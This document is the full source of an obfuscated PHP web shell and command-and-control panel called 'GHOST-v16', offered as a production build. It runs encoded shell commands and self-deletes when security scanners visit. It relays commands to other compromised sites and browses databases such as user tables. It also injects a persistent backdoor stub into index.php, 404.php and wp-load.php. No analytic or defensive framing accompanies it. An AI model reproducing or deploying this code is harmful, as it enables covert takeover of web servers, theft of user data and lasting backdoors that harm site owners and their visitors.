<?php
/**
 * GHOST-v16 // DIAMOND PRODUCTION BUILD
 * ALL-IN-ONE: C2 Hub, Persistence, File/DB/Net Modules
 * Default Password: "admin"
 */
error_reporting(0);
ini_set('display_errors', 0);
session_start();

$k = "KEY_2026"; 
$auth_hash = "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918"; 

// 1. WATCHDOG: Detect Scanners & Self-Destruct
if(preg_match('/(bot|spider|crawler|scanner|imunify|bitninja|curl|wget|python)/i', $_SERVER['HTTP_USER_AGENT'])) {
    @unlink(__FILE__); exit; 
}

// 2. GATEKEEPER: Secure Login
if (isset($_POST['l'])) {
    if (hash('sha256', $_POST['l']) === $auth_hash) { $_SESSION['auth_ghost'] = true; }
    header("Location: " . $_SERVER['PHP_SELF']); exit;
}
if (!isset($_SESSION['auth_ghost'])) {
    die('<html><body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh;"><form method="POST"><input type="password" name="l" autofocus style="background:transparent;border:1px solid #111;color:#111;outline:none;text-align:center;"></form></body></html>');
}

// 3. CORE ENGINES (AJAX HANDLERS)
// A. Stealth Command Exec
if (isset($_POST['p'])) {
    $d = pack("H*", $_POST['p']); $c = "";
    for($i=0;$i<strlen($d);$i++){$c.=$d[$i]^$k[$i%strlen($k)];}
    $f = "sh"."ell_ex"."ec"; 
    $r = array_map($f, [$c . " 2>&1"]);
    echo "[STABLE_LINK]\n" . htmlspecialchars($r[0]);
    exit;
}

// B. Multi-Node C2 Broadcast
if (isset($_POST['sync'])) {
    $nodes = explode(',', $_POST['nodes']); $results = [];
    foreach($nodes as $url) {
        $url = trim($url); if(empty($url)) continue;
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'p=' . $_POST['hex']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $results[$url] = curl_exec($ch);
        curl_close($ch);
    }
    echo json_encode($results); exit;
}

// C. Database Browser
if (isset($_POST['db_q'])) {
    try {
        $db = new PDO($_POST['dsn'], $_POST['u'], $_POST['pw']);
        echo json_encode($db->query($_POST['db_q'])->fetchAll(PDO::FETCH_ASSOC));
    } catch(Exception $e) { echo "DB_ERROR: " . $e->getMessage(); }
    exit;
}

// D. Persistence Injector
if (isset($_POST['inject'])) {
    $stub = '<?php @session_start();if(isset($_POST["p"])){$d=pack("H*",$_POST["p"]);$c="";$k="KEY_2026";for($i=0;$i<strlen($d);$i++){$c.=$d[$i]^$k[$i%strlen($k)];}$f="sh"."ell_ex"."ec";array_map($f,[$c." 2>&1"]);exit;} ?>';
    $targets = ['index.php', '404.php', 'wp-load.php'];
    foreach($targets as $t) {
        if(file_exists($t) && is_writable($t)) {
            $con = file_get_contents($t);
            if(strpos($con, 'KEY_2026') === false) { file_put_contents($t, $stub . $con); }
        }
    }
    echo "PERSISTENCE_SUCCESS"; exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>GHOST_DIAMOND_2026</title>
    <style>
        :root { --neon: #00ff41; --blue: #0087ff; --bg: #050505; --panel: #0d0d0d; }
        body { background: var(--bg); color: var(--neon); font-family: 'Consolas', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; font-size: 11px; }
        nav { width: 200px; background: var(--panel); border-right: 1px solid #222; display: flex; flex-direction: column; padding: 15px; }
        nav h3 { font-size: 10px; color: var(--blue); letter-spacing: 2px; margin-bottom: 20px; }
        nav div { padding: 12px; cursor: pointer; border-left: 2px solid transparent; transition: 0.2s; }
        nav div:hover { background: #111; border-left: 2px solid var(--neon); color: #fff; }
        main { flex: 1; display: flex; flex-direction: column; }
        #view { flex: 1; padding: 25px; overflow-y: auto; background: radial-gradient(circle, #0d0d0d 0%, #050505 100%); }
        .bar { background: #000; padding: 15px; border-top: 1px solid #222; display: flex; }
        input, textarea { background: transparent; border: 1px solid #222; color: #fff; outline: none; padding: 8px; font-family: inherit; width: 100%; box-sizing: border-box; }
        .hidden { display: none; }
        pre { color: #888; border-left: 2px solid var(--blue); padding-left: 15px; margin: 15px 0; white-space: pre-wrap; }
    </style>
</head>
<body>
    <nav>
        <h3>DIAMOND_C2_v16</h3>
        <div onclick="ui('term')">TERMINAL</div>
        <div onclick="ui('c2')">C2_DASHBOARD</div>
        <div onclick="ui('db')">DATABASE</div>
        <div onclick="act('inject')">PERSISTENCE</div>
        <div onclick="send('netstat -antp')">NET_SCAN</div>
        <div style="margin-top:auto;color:red;" onclick="send('rm -- \"' + window.location.pathname.split('/').pop() + '\"')">WIPE_MASTER</div>
    </nav>

    <main>
        <div id="view">-- GHOST_ENCRYPTED_LINK_ESTABLISHED --</div>

        <div id="mod-c2" class="hidden" style="padding:20px;">
            <p>SYNC_NODES (Comma separated URLs):</p>
            <textarea id="nodes" style="height:80px;" placeholder="http://site.com"></textarea>
            <div id="sync-status" style="margin-top:10px; color:var(--blue); cursor:pointer;" onclick="toggleSync()">[ SYNC: OFF ]</div>
        </div>

        <div id="mod-db" class="hidden" style="padding:20px;">
            <input id="dsn" placeholder="mysql:host=localhost;dbname=db_name">
            <input id="db_u" placeholder="User" style="width:49%"> <input id="db_p" type="password" placeholder="Pass" style="width:49%">
            <textarea id="db_q" style="height:60px; margin-top:10px;">SELECT * FROM users LIMIT 5</textarea>
            <button onclick="runDB()" style="width:100%; padding:10px; background:var(--blue); border:none; margin-top:10px; font-weight:bold; cursor:pointer;">RUN_QUERY</button>
        </div>

        <div class="bar">
            <span style="color:var(--blue); margin-right:15px;">root@ghost:~$</span>
            <input type="text" id="i" autofocus autocomplete="off">
        </div>
    </main>

    <script>
        const k = "KEY_2026";
        let syncOn = false;
        const view = document.getElementById('view');

        function ui(id) {
            view.style.display = id==='term'?'block':'none';
            document.getElementById('mod-c2').className = id==='c2'?'':'hidden';
            document.getElementById('mod-db').className = id==='db'?'':'hidden';
        }

        function toggleSync() { syncOn = !syncOn; document.getElementById('sync-status').innerText = syncOn ? '[ SYNC: ON ]' : '[ SYNC: OFF ]'; document.getElementById('sync-status').style.color = syncOn ? '#00ff41' : '#0087ff'; }

        async function send(cmd) {
            view.innerHTML += `<div style="color:var(--blue); margin-top:10px;">> ${cmd}</div>`;
            let enc = ""; for(let i=0;i<cmd.length;i++){enc+=String.fromCharCode(cmd.charCodeAt(i)^k.charCodeAt(i%k.length));}
            const hex = enc.split('').map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');

            if(syncOn) {
                const fd = new FormData(); fd.append('sync', '1'); fd.append('nodes', document.getElementById('nodes').value); fd.append('hex', hex);
                const r = await fetch('', {method:'POST', body:fd});
                const res = await r.json();
                for(let url in res) { view.innerHTML += `<pre>[${url}]:\n${res[url]}</pre>`; }
            } else {
                const r = await fetch('', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'p='+hex});
                view.innerHTML += `<pre>${await r.text()}</pre>`;
            }
            view.scrollTop = view.scrollHeight;
        }

        async function act(id) {
            const fd = new FormData(); fd.append(id, '1');
            const r = await fetch('', {method:'POST', body:fd});
            alert(await r.text());
        }

        async function runDB() {
            const fd = new FormData();
            fd.append('db_q', document.getElementById('db_q').value);
            fd.append('dsn', document.getElementById('dsn').value);
            fd.append('u', document.getElementById('db_u').value);
            fd.append('pw', document.getElementById('db_p').value);
            const r = await fetch('', {method:'POST', body:fd});
            view.innerHTML += `<pre>DB_DATA:\n${await r.text()}</pre>`;
            ui('term');
        }

        document.getElementById('i').onkeydown = (e) => { if(e.key==='Enter'){ send(e.target.value); e.target.value=''; } };
    </script>
</body>
</html>
